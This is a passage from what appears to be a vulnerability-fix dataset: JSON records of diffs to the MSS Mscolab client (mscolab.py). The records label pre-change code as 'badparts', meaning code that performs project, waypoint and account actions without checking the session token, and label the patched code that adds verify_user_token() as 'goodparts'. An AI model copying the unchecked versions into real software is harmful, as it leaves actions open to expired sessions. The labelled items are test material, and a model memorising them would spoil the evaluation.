self.admin_window is not None:","            self.admin_window.raise_()","            self.admin_window.activateWindow()","            return","        self.admin_window = maw.MSColabAdminWindow(self.token, self.active_pid, self.user,","                                                   self.active_project_name, self.projects, self.conn,","                                                   mscolab_server_url=self.mscolab_server_url)","        self.admin_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)","        self.admin_window.viewCloses.connect(self.close_admin_window)","        self.admin_window.show()","        if self.active_pid is None:","            return","        if self.version_window is not None:","            self.version_window.raise_()","            self.version_window.activateWindow()","            return","        self.version_window = mvh.MSColabVersionHistory(self.token, self.active_pid, self.user,","                                                        self.active_project_name, self.conn,","                                                        mscolab_server_url=self.mscolab_server_url)","        self.version_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)","        self.version_window.viewCloses.connect(self.close_version_history_window)","        self.version_window.reloadWindows.connect(self.reload_windows_slot)","        self.version_window.show()"],"goodparts":["        if self.verify_user_token():","            entered_project_name, ok = QtWidgets.QInputDialog.getText(","                self,","                self.tr('Delete Project'),","                self.tr(f\"You're about to delete the project - '{self.active_project_name}'. \"","                        f\"Enter the project name to confirm: \"))","            if ok:","                if entered_project_name == self.active_project_name:","                    data = {","                        \"token\": self.token,","                        \"p_id\": self.active_pid","                    }","                    url = url_join(self.mscolab_server_url, 'delete_project')","                    try:","                        res = requests.post(url, data=data)","                        res.raise_for_status()","                    except requests.exceptions.RequestException as e:","                        logging.debug(e)","                        show_popup(self, \"Error\", \"Some error occurred! Could not delete project.\")","                else:","                    show_popup(self, \"Error\", \"Entered project name did not match!\")","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            if self.active_pid is None:","                return","            if self.chat_window is not None:","                self.chat_window.raise_()","                self.chat_window.activateWindow()","                return","            self.chat_window = mp.MSColabProjectWindow(self.token, self.active_pid, self.user, self.active_project_name,","                                                       self.access_level, self.conn,","                                                       mscolab_server_url=self.mscolab_server_url)","            self.chat_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)","            self.chat_window.viewCloses.connect(self.close_chat_window)","            self.chat_window.reloadWindows.connect(self.reload_windows_slot)","            self.chat_window.show()","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            if self.active_pid is None:","                return","            if self.admin_window is not None:","                self.admin_window.raise_()","                self.admin_window.activateWindow()","                return","            self.admin_window = maw.MSColabAdminWindow(self.token, self.active_pid, self.user,","                                                       self.active_project_name, self.projects, self.conn,","                                                       mscolab_server_url=self.mscolab_server_url)","            self.admin_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)","            self.admin_window.viewCloses.connect(self.close_admin_window)","            self.admin_window.show()","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            if self.active_pid is None:","                return","            if self.version_window is not None:","                self.version_window.raise_()","                self.version_window.activateWindow()","                return","            self.version_window = mvh.MSColabVersionHistory(self.token, self.active_pid, self.user,","                                                            self.active_project_name, self.conn,","                                                            mscolab_server_url=self.mscolab_server_url)","            self.version_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)","            self.version_window.viewCloses.connect(self.close_version_history_window)","            self.version_window.reloadWindows.connect(self.reload_windows_slot)","            self.version_window.show()","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n             mss_dir.writetext(rel_file_path, server_data)\n \n     def handle_work_locally_toggle(self):\n-        if self.workLocallyCheckBox.isChecked():\n-            if self.version_window is not None:\n-                self.version_window.close()\n-            self.create_local_project_file()\n-            self.local_ftml_file = fs.path.combine(self.data_dir,\n-                                                   fs.path.join('local_mscolab_data',\n-                                                                self.user['username'], self.active_project_name,\n-                                                                'mscolab_project.ftml'))\n-            self.helperTextLabel.setText(\n-                self.tr(\"Working On: Local File. Your changes are only available to you.\"\n-                        \"To save your changes with everyone, use the \\\"Save to Server\\\" button.\"))\n-            self.save_ft.setEnabled(True)\n-            self.fetch_ft.setEnabled(True)\n-            self.versionHistoryBtn.setEnabled(False)\n-            self.reload_local_wp()\n+        if self.verify_user_token():\n+            if self.workLocallyCheckBox.isChecked():\n+                if self.version_window is not None:\n+                    self.version_window.close()\n+                self.create_local_project_file()\n+                self.local_ftml_file = fs.path.combine(self.data_dir,\n+                                                       fs.path.join('local_mscolab_data',\n+                                                                    self.user['username'], self.active_project_name,\n+                                                                    'mscolab_project.ftml'))\n+                self.helperTextLabel.setText(\n+                    self.tr(\"Working On: Local File. Your changes are only available to you.\"\n+                            \"To save your changes with everyone, use the \\\"Save to Server\\\" button.\"))\n+                self.save_ft.setEnabled(True)\n+                self.fetch_ft.setEnabled(True)\n+                self.versionHistoryBtn.setEnabled(False)\n+                self.reload_local_wp()\n \n+            else:\n+                self.local_ftml_file = None\n+                self.helperTextLabel.setText(\n+                    self.tr(\"Working On: Shared File. All your changes will be shared with everyone.\"\n+                            \"Turn on work locally to work on local flight track file\"))\n+                self.save_ft.setEnabled(False)\n+                self.fetch_ft.setEnabled(False)\n+                if self.access_level in [\"admin\", \"creator\", \"collaborator\"]:\n+                    self.versionHistoryBtn.setEnabled(True)\n+                self.waypoints_model = None\n+                self.load_wps_from_server()\n+            self.reload_view_windows()\n         else:\n-            self.local_ftml_file = None\n-            self.helperTextLabel.setText(\n-                self.tr(\"Working On: Shared File. All your changes will be shared with everyone.\"\n-                        \"Turn on work locally to work on local flight track file\"))\n-            self.save_ft.setEnabled(False)\n-            self.fetch_ft.setEnabled(False)\n-            if self.access_level in [\"admin\", \"creator\", \"collaborator\"]:\n-                self.versionHistoryBtn.setEnabled(True)\n-            self.waypoints_model = None\n-            self.load_wps_from_server()\n-        self.reload_view_windows()\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n+\n+    def verify_user_token(self):\n+        data = {\n+            \"token\": self.token\n+        }\n+        try:\n+            r = requests.get(f'{self.mscolab_server_url}\/test_authorized', data=data)\n+        except requests.exceptions.ConnectionError as ex:\n+            logging.error(\"unexpected error: %s %s\", type(ex), ex)\n+            return False\n+        return r.text == \"True\"\n \n     def authorize(self):\n         for key, value in config_loader(dataset=\"MSC_login\").items():\n","add":41,"remove":26,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        if self.workLocallyCheckBox.isChecked():","            if self.version_window is not None:","                self.version_window.close()","            self.create_local_project_file()","            self.local_ftml_file = fs.path.combine(self.data_dir,","                                                   fs.path.join('local_mscolab_data',","                                                                self.user['username'], self.active_project_name,","                                                                'mscolab_project.ftml'))","            self.helperTextLabel.setText(","                self.tr(\"Working On: Local File. Your changes are only available to you.\"","                        \"To save your changes with everyone, use the \\\"Save to Server\\\" button.\"))","            self.save_ft.setEnabled(True)","            self.fetch_ft.setEnabled(True)","            self.versionHistoryBtn.setEnabled(False)","            self.reload_local_wp()","            self.local_ftml_file = None","            self.helperTextLabel.setText(","                self.tr(\"Working On: Shared File. All your changes will be shared with everyone.\"","                        \"Turn on work locally to work on local flight track file\"))","            self.save_ft.setEnabled(False)","            self.fetch_ft.setEnabled(False)","            if self.access_level in [\"admin\", \"creator\", \"collaborator\"]:","                self.versionHistoryBtn.setEnabled(True)","            self.waypoints_model = None","            self.load_wps_from_server()","        self.reload_view_windows()"],"goodparts":["        if self.verify_user_token():","            if self.workLocallyCheckBox.isChecked():","                if self.version_window is not None:","                    self.version_window.close()","                self.create_local_project_file()","                self.local_ftml_file = fs.path.combine(self.data_dir,","                                                       fs.path.join('local_mscolab_data',","                                                                    self.user['username'], self.active_project_name,","                                                                    'mscolab_project.ftml'))","                self.helperTextLabel.setText(","                    self.tr(\"Working On: Local File. Your changes are only available to you.\"","                            \"To save your changes with everyone, use the \\\"Save to Server\\\" button.\"))","                self.save_ft.setEnabled(True)","                self.fetch_ft.setEnabled(True)","                self.versionHistoryBtn.setEnabled(False)","                self.reload_local_wp()","            else:","                self.local_ftml_file = None","                self.helperTextLabel.setText(","                    self.tr(\"Working On: Shared File. All your changes will be shared with everyone.\"","                            \"Turn on work locally to work on local flight track file\"))","                self.save_ft.setEnabled(False)","                self.fetch_ft.setEnabled(False)","                if self.access_level in [\"admin\", \"creator\", \"collaborator\"]:","                    self.versionHistoryBtn.setEnabled(True)","                self.waypoints_model = None","                self.load_wps_from_server()","            self.reload_view_windows()","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","    def verify_user_token(self):","        data = {","            \"token\": self.token","        }","        try:","            r = requests.get(f'{self.mscolab_server_url}\/test_authorized', data=data)","        except requests.exceptions.ConnectionError as ex:","            logging.error(\"unexpected error: %s %s\", type(ex), ex)","            return False","        return r.text == \"True\""]},{"diff":"\n \n     def add_projects(self):\n         # add projects\n-        data = {\n-            \"token\": self.token\n-        }\n-        r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n-        if r.text != \"False\":\n-            _json = json.loads(r.text)\n-            self.projects = _json[\"projects\"]\n-            self.add_projects_to_ui(self.projects)\n+        if self.verify_user_token():\n+            data = {\n+                \"token\": self.token\n+            }\n+            r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n+            if r.text != \"False\":\n+                _json = json.loads(r.text)\n+                self.projects = _json[\"projects\"]\n+                self.add_projects_to_ui(self.projects)\n+            else:\n+                show_popup(self, \"Error\", \"Session expired, new login required\")\n         else:\n-            show_popup(self, \"Error\", \"Session expired, new login required\")\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def get_recent_pid(self):\n         \"\"\"\n         get most recent project's p_id\n         \"\"\"\n-        data = {\n-            \"token\": self.token\n-        }\n-        r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n-        if r.text != \"False\":\n-            _json = json.loads(r.text)\n-            projects = _json[\"projects\"]\n-            p_id = None\n-            if projects:\n-                p_id = projects[-1][\"p_id\"]\n-            return p_id\n+        if self.verify_user_token():\n+            data = {\n+                \"token\": self.token\n+            }\n+            r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n+            if r.text != \"False\":\n+                _json = json.loads(r.text)\n+                projects = _json[\"projects\"]\n+                p_id = None\n+                if projects:\n+                    p_id = projects[-1][\"p_id\"]\n+                return p_id\n+            else:\n+                show_popup(self, \"Error\", \"Session expired, new login required\")\n         else:\n-            show_popup(self, \"Error\", \"Session expired, new login required\")\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def get_recent_project(self):\n         \"\"\"\n         get most recent project\n         \"\"\"\n-        data = {\n-            \"token\": self.token\n-        }\n-        r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n-        if r.text != \"False\":\n-            _json = json.loads(r.text)\n-            projects = _json[\"projects\"]\n-            recent_project = None\n-            if projects:\n-                recent_project = projects[-1]\n-            return recent_project\n+        if self.verify_user_token():\n+            data = {\n+                \"token\": self.token\n+            }\n+            r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n+            if r.text != \"False\":\n+                _json = json.loads(r.text)\n+                projects = _json[\"projects\"]\n+                recent_project = None\n+                if projects:\n+                    recent_project = projects[-1]\n+                return recent_project\n+            else:\n+                show_popup(self, \"Error\", \"Session expired, new login required\")\n         else:\n-            show_popup(self, \"Error\", \"Session expired, new login required\")\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def add_projects_to_ui(self, projects):\n         logging.debug(\"adding projects to ui\")\n","add":45,"remove":33,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        data = {","            \"token\": self.token","        }","        r = requests.get(self.mscolab_server_url + '\/projects', data=data)","        if r.text != \"False\":","            _json = json.loads(r.text)","            self.projects = _json[\"projects\"]","            self.add_projects_to_ui(self.projects)","            show_popup(self, \"Error\", \"Session expired, new login required\")","        data = {","            \"token\": self.token","        }","        r = requests.get(self.mscolab_server_url + '\/projects', data=data)","        if r.text != \"False\":","            _json = json.loads(r.text)","            projects = _json[\"projects\"]","            p_id = None","            if projects:","                p_id = projects[-1][\"p_id\"]","            return p_id","            show_popup(self, \"Error\", \"Session expired, new login required\")","        data = {","            \"token\": self.token","        }","        r = requests.get(self.mscolab_server_url + '\/projects', data=data)","        if r.text != \"False\":","            _json = json.loads(r.text)","            projects = _json[\"projects\"]","            recent_project = None","            if projects:","                recent_project = projects[-1]","            return recent_project","            show_popup(self, \"Error\", \"Session expired, new login required\")"],"goodparts":["        if self.verify_user_token():","            data = {","                \"token\": self.token","            }","            r = requests.get(self.mscolab_server_url + '\/projects', data=data)","            if r.text != \"False\":","                _json = json.loads(r.text)","                self.projects = _json[\"projects\"]","                self.add_projects_to_ui(self.projects)","            else:","                show_popup(self, \"Error\", \"Session expired, new login required\")","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            data = {","                \"token\": self.token","            }","            r = requests.get(self.mscolab_server_url + '\/projects', data=data)","            if r.text != \"False\":","                _json = json.loads(r.text)","                projects = _json[\"projects\"]","                p_id = None","                if projects:","                    p_id = projects[-1][\"p_id\"]","                return p_id","            else:","                show_popup(self, \"Error\", \"Session expired, new login required\")","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            data = {","                \"token\": self.token","            }","            r = requests.get(self.mscolab_server_url + '\/projects', data=data)","            if r.text != \"False\":","                _json = json.loads(r.text)","                projects = _json[\"projects\"]","                recent_project = None","                if projects:","                    recent_project = projects[-1]","                return recent_project","            else:","                show_popup(self, \"Error\", \"Session expired, new login required\")","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n         self.active_windows = []\n \n     def set_active_pid(self, item):\n-        if item.p_id == self.active_pid:\n-            return\n-        # close all hanging window\n-        self.force_close_view_windows()\n-        self.close_external_windows()\n-        # Turn off work locally toggle\n-        self.workLocallyCheckBox.blockSignals(True)\n-        self.workLocallyCheckBox.setChecked(False)\n-        self.workLocallyCheckBox.blockSignals(False)\n-        self.save_ft.setEnabled(False)\n-        self.fetch_ft.setEnabled(False)\n-\n-        # set active_pid here\n-        self.active_pid = item.p_id\n-        self.access_level = item.access_level\n-        self.active_project_name = item.text().split(\"-\")[0].strip()\n-        self.waypoints_model = None\n-        # set active flightpath here\n-        self.load_wps_from_server()\n-        # enable project specific buttons\n-        self.helperTextLabel.setVisible(True)\n-        self.helperTextLabel.setText(self.tr(\"Working On: Shared File. All your changes will be shared with everyone.\"\n-                                             \"Turn on work locally to work on local flight track file\"))\n-        self.importBtn.setEnabled(True)\n-        self.exportBtn.setEnabled(True)\n-        self.topview.setEnabled(True)\n-        self.sideview.setEnabled(True)\n-        self.tableview.setEnabled(True)\n-        self.workLocallyCheckBox.setEnabled(True)\n-\n-        # enable access level specific buttons\n-        self.handle_mscolab_buttons()\n-\n-        # change font style for selected\n-        font = QtGui.QFont()\n-        for i in range(self.listProjects.count()):\n-            self.listProjects.item(i).setFont(font)\n-        font.setBold(True)\n-        item.setFont(font)\n+        if self.verify_user_token():\n+            if item.p_id == self.active_pid:\n+                return\n+            # close all hanging window\n+            self.force_close_view_windows()\n+            self.close_external_windows()\n+            # Turn off work locally toggle\n+            self.workLocallyCheckBox.blockSignals(True)\n+            self.workLocallyCheckBox.setChecked(False)\n+            self.workLocallyCheckBox.blockSignals(False)\n+            self.save_ft.setEnabled(False)\n+            self.fetch_ft.setEnabled(False)\n+            # set active_pid here\n+            self.active_pid = item.p_id\n+            self.access_level = item.access_level\n+            self.active_project_name = item.text().split(\"-\")[0].strip()\n+            self.waypoints_model = None\n+            # set active flightpath here\n+            self.load_wps_from_server()\n+            # enable project specific buttons\n+            self.helperTextLabel.setVisible(True)\n+            self.helperTextLabel.setText(self.tr(\"Working On: Shared File.\"\n+                                                 \"All your changes will be shared with everyone.\"\n+                                                 \"Turn on work locally to work on local flight track file\"))\n+            self.importBtn.setEnabled(True)\n+            self.exportBtn.setEnabled(True)\n+            self.topview.setEnabled(True)\n+            self.sideview.setEnabled(True)\n+            self.tableview.setEnabled(True)\n+            self.workLocallyCheckBox.setEnabled(True)\n+            # enable access level specific buttons\n+            self.handle_mscolab_buttons()\n+            # change font style for selected\n+            font = QtGui.QFont()\n+            for i in range(self.listProjects.count()):\n+                self.listProjects.item(i).setFont(font)\n+            font.setBold(True)\n+            item.setFont(font)\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def reload_wps_from_server(self):\n         if self.active_pid is None:\n","add":41,"remove":39,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        if item.p_id == self.active_pid:","            return","        self.force_close_view_windows()","        self.close_external_windows()","        self.workLocallyCheckBox.blockSignals(True)","        self.workLocallyCheckBox.setChecked(False)","        self.workLocallyCheckBox.blockSignals(False)","        self.save_ft.setEnabled(False)","        self.fetch_ft.setEnabled(False)","        self.active_pid = item.p_id","        self.access_level = item.access_level","        self.active_project_name = item.text().split(\"-\")[0].strip()","        self.waypoints_model = None","        self.load_wps_from_server()","        self.helperTextLabel.setVisible(True)","        self.helperTextLabel.setText(self.tr(\"Working On: Shared File. All your changes will be shared with everyone.\"","                                             \"Turn on work locally to work on local flight track file\"))","        self.importBtn.setEnabled(True)","        self.exportBtn.setEnabled(True)","        self.topview.setEnabled(True)","        self.sideview.setEnabled(True)","        self.tableview.setEnabled(True)","        self.workLocallyCheckBox.setEnabled(True)","        self.handle_mscolab_buttons()","        font = QtGui.QFont()","        for i in range(self.listProjects.count()):","            self.listProjects.item(i).setFont(font)","        font.setBold(True)","        item.setFont(font)"],"goodparts":["        if self.verify_user_token():","            if item.p_id == self.active_pid:","                return","            self.force_close_view_windows()","            self.close_external_windows()","            self.workLocallyCheckBox.blockSignals(True)","            self.workLocallyCheckBox.setChecked(False)","            self.workLocallyCheckBox.blockSignals(False)","            self.save_ft.setEnabled(False)","            self.fetch_ft.setEnabled(False)","            self.active_pid = item.p_id","            self.access_level = item.access_level","            self.active_project_name = item.text().split(\"-\")[0].strip()","            self.waypoints_model = None","            self.load_wps_from_server()","            self.helperTextLabel.setVisible(True)","            self.helperTextLabel.setText(self.tr(\"Working On: Shared File.\"","                                                 \"All your changes will be shared with everyone.\"","                                                 \"Turn on work locally to work on local flight track file\"))","            self.importBtn.setEnabled(True)","            self.exportBtn.setEnabled(True)","            self.topview.setEnabled(True)","            self.sideview.setEnabled(True)","            self.tableview.setEnabled(True)","            self.workLocallyCheckBox.setEnabled(True)","            self.handle_mscolab_buttons()","            font = QtGui.QFont()","            for i in range(self.listProjects.count()):","                self.listProjects.item(i).setFont(font)","            font.setBold(True)","            item.setFont(font)","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n         self.reload_view_windows()\n \n     def request_wps_from_server(self):\n-        data = {\n-            \"token\": self.token,\n-            \"p_id\": self.active_pid\n-        }\n-        r = requests.get(self.mscolab_server_url + '\/get_project_by_id', data=data)\n-        if r.text != \"False\":\n-            xml_content = json.loads(r.text)[\"content\"]\n-            return xml_content\n+        if self.verify_user_token():\n+            data = {\n+                \"token\": self.token,\n+                \"p_id\": self.active_pid\n+            }\n+            r = requests.get(self.mscolab_server_url + '\/get_project_by_id', data=data)\n+            if r.text != \"False\":\n+                xml_content = json.loads(r.text)[\"content\"]\n+                return xml_content\n+            else:\n+                show_popup(self, \"Error\", \"Session expired, new login required\")\n         else:\n-            show_popup(self, \"Error\", \"Session expired, new login required\")\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def load_wps_from_server(self):\n         if self.workLocallyCheckBox.isChecked():\n","add":13,"remove":9,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        data = {","            \"token\": self.token,","            \"p_id\": self.active_pid","        }","        r = requests.get(self.mscolab_server_url + '\/get_project_by_id', data=data)","        if r.text != \"False\":","            xml_content = json.loads(r.text)[\"content\"]","            return xml_content","            show_popup(self, \"Error\", \"Session expired, new login required\")"],"goodparts":["        if self.verify_user_token():","            data = {","                \"token\": self.token,","                \"p_id\": self.active_pid","            }","            r = requests.get(self.mscolab_server_url + '\/get_project_by_id', data=data)","            if r.text != \"False\":","                xml_content = json.loads(r.text)[\"content\"]","                return xml_content","            else:","                show_popup(self, \"Error\", \"Session expired, new login required\")","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n \n     def open_topview(self):\n         # showing dummy info dialog\n-        if self.active_pid is None:\n-            return\n-        self.create_view_window(\"topview\")\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n+            self.create_view_window(\"topview\")\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def open_sideview(self):\n         # showing dummy info dialog\n-        if self.active_pid is None:\n-            return\n-        self.create_view_window(\"sideview\")\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n+            self.create_view_window(\"sideview\")\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def open_tableview(self):\n         # showing dummy info dialog\n-        if self.active_pid is None:\n-            return\n-        self.create_view_window(\"tableview\")\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n+            self.create_view_window(\"tableview\")\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def create_view_window(self, _type):\n         for active_window in self.active_windows:\n","add":21,"remove":9,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        if self.active_pid is None:","            return","        self.create_view_window(\"topview\")","        if self.active_pid is None:","            return","        self.create_view_window(\"sideview\")","        if self.active_pid is None:","            return","        self.create_view_window(\"tableview\")"],"goodparts":["        if self.verify_user_token():","            if self.active_pid is None:","                return","            self.create_view_window(\"topview\")","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            if self.active_pid is None:","                return","            self.create_view_window(\"sideview\")","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            if self.active_pid is None:","                return","            self.create_view_window(\"tableview\")","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n         self.password.setEnabled(True)\n \n     def delete_account(self):\n-        w = QtWidgets.QWidget()\n-        qm = QtWidgets.QMessageBox\n-        reply = qm.question(w, self.tr('Continue?'),\n-                            self.tr(\"You're about to delete your account. You cannot undo this operation!\"),\n-                            qm.Yes, qm.No)\n-        if reply == QtWidgets.QMessageBox.No:\n-            return\n-        data = {\n-            \"token\": self.token\n-        }\n-        requests.post(self.mscolab_server_url + '\/delete_user', data=data)\n-        self.clean_up_window()\n+        if self.verify_user_token():\n+            w = QtWidgets.QWidget()\n+            qm = QtWidgets.QMessageBox\n+            reply = qm.question(w, self.tr('Continue?'),\n+                                self.tr(\"You're about to delete your account. You cannot undo this operation!\"),\n+                                qm.Yes, qm.No)\n+            if reply == QtWidgets.QMessageBox.No:\n+                return\n+            data = {\n+                \"token\": self.token\n+            }\n+            requests.post(self.mscolab_server_url + '\/delete_user', data=data)\n+            self.clean_up_window()\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def close_external_windows(self):\n         if self.chat_window is not None:\n","add":16,"remove":12,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        w = QtWidgets.QWidget()","        qm = QtWidgets.QMessageBox","        reply = qm.question(w, self.tr('Continue?'),","                            self.tr(\"You're about to delete your account. You cannot undo this operation!\"),","                            qm.Yes, qm.No)","        if reply == QtWidgets.QMessageBox.No:","            return","        data = {","            \"token\": self.token","        }","        requests.post(self.mscolab_server_url + '\/delete_user', data=data)","        self.clean_up_window()"],"goodparts":["        if self.verify_user_token():","            w = QtWidgets.QWidget()","            qm = QtWidgets.QMessageBox","            reply = qm.question(w, self.tr('Continue?'),","                                self.tr(\"You're about to delete your account. You cannot undo this operation!\"),","                                qm.Yes, qm.No)","            if reply == QtWidgets.QMessageBox.No:","                return","            data = {","                \"token\": self.token","            }","            requests.post(self.mscolab_server_url + '\/delete_user', data=data)","            self.clean_up_window()","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n         save_settings_qsettings('mscolab', self.settings)\n \n     def save_wp_mscolab(self, comment=None):\n-        server_xml = self.request_wps_from_server()\n-        server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)\n-        self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, parent=self)\n-        self.merge_dialog.saveBtn.setDisabled(True)\n-        if self.merge_dialog.exec_():\n-            xml_content = self.merge_dialog.get_values()\n-            if xml_content is not None:\n-                self.conn.save_file(self.token, self.active_pid, xml_content, comment=comment)\n-                self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)\n-                self.waypoints_model.save_to_ftml(self.local_ftml_file)\n-                self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n-                self.reload_view_windows()\n-                show_popup(self, \"Success\", \"New Waypoints Saved To Server!\", icon=1)\n-        self.merge_dialog = None\n+        if self.verify_user_token():\n+            server_xml = self.request_wps_from_server()\n+            server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)\n+            self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, parent=self)\n+            self.merge_dialog.saveBtn.setDisabled(True)\n+            if self.merge_dialog.exec_():\n+                xml_content = self.merge_dialog.get_values()\n+                if xml_content is not None:\n+                    self.conn.save_file(self.token, self.active_pid, xml_content, comment=comment)\n+                    self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)\n+                    self.waypoints_model.save_to_ftml(self.local_ftml_file)\n+                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+                    self.reload_view_windows()\n+                    show_popup(self, \"Success\", \"New Waypoints Saved To Server!\", icon=1)\n+            self.merge_dialog = None\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def handle_waypoints_changed(self):\n-        if self.workLocallyCheckBox.isChecked():\n-            self.waypoints_model.save_to_ftml(self.local_ftml_file)\n+        if self.verify_user_token():\n+            if self.workLocallyCheckBox.isChecked():\n+                self.waypoints_model.save_to_ftml(self.local_ftml_file)\n+            else:\n+                xml_content = self.waypoints_model.get_xml_content()\n+                self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)\n         else:\n-            xml_content = self.waypoints_model.get_xml_content()\n-            self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def reload_view_windows(self):\n         for window in self.active_windows:\n","add":26,"remove":18,"filename":"\/mslib\/msui\/mscolab.py","badparts":["        server_xml = self.request_wps_from_server()","        server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)","        self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, parent=self)","        self.merge_dialog.saveBtn.setDisabled(True)","        if self.merge_dialog.exec_():","            xml_content = self.merge_dialog.get_values()","            if xml_content is not None:","                self.conn.save_file(self.token, self.active_pid, xml_content, comment=comment)","                self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)","                self.waypoints_model.save_to_ftml(self.local_ftml_file)","                self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","                self.reload_view_windows()","                show_popup(self, \"Success\", \"New Waypoints Saved To Server!\", icon=1)","        self.merge_dialog = None","        if self.workLocallyCheckBox.isChecked():","            self.waypoints_model.save_to_ftml(self.local_ftml_file)","            xml_content = self.waypoints_model.get_xml_content()","            self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)"],"goodparts":["        if self.verify_user_token():","            server_xml = self.request_wps_from_server()","            server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)","            self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, parent=self)","            self.merge_dialog.saveBtn.setDisabled(True)","            if self.merge_dialog.exec_():","                xml_content = self.merge_dialog.get_values()","                if xml_content is not None:","                    self.conn.save_file(self.token, self.active_pid, xml_content, comment=comment)","                    self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)","                    self.waypoints_model.save_to_ftml(self.local_ftml_file)","                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)","                    self.reload_view_windows()","                    show_popup(self, \"Success\", \"New Waypoints Saved To Server!\", icon=1)","            self.merge_dialog = None","        else:","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()","        if self.verify_user_token():","            if self.workLocallyCheckBox.isChecked():","                self.waypoints_model.save_to_ftml(self.local_ftml_file)","            else:","                xml_content = self.waypoints_model.get_xml_content()","                self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)","            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")","            self.logout()"]},{"diff":"\n         self.reload_view_windows()\n \n     def fetch_wp_mscolab(self):\n-        server_xml = self.request_wps_from_server()\n-        server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)\n-        self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, True, self)\n-        self.merge_dialog.saveBtn.setDisabled(True)\n-        if self.merge_dialog.exec_():\n-            xml_content = self.merge_dialog.get_values()\n-            if xml_content is not None:\n-                self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)\n-                self.waypoints_model.save_to_ftml(self.local_ftml_file)\n-                self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n-                self.reload_view_windows()\n-                show_popup(self, \"Success\", \"New Waypoints Fetched To Local File!\", 